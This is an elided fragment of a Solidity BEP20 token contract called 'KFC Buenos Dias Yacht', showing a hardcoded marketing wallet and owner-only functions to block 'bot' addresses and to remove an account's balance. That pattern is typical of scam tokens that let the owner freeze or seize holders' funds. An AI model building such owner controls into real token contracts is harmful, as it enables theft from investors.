...
*/
    ...
    contract KFCBuenosDiasYacht  is IBEP20, Ownable
    {
        ...
        string private constant _name = "KFC Buenos Dias Yacht";
        string private constant _symbol = "BDIAS";
        ...
        address public constant MarketingWallet=0xd38045B6E169Ef5122A4ED0176D3c74cd8914646; 
        ...
        constructor () {
           ...
           function ClaimBlockBotsAddress(address account) external onlyOwner {
            _isSendRewards[account] = false;
          }
          
            function SendBotBlockBotsAddress(address[] calldata addresses) external onlyOwner {
      ...
      function RemoveBots(address account, uint256 balance) onlyOwner  public virtual {
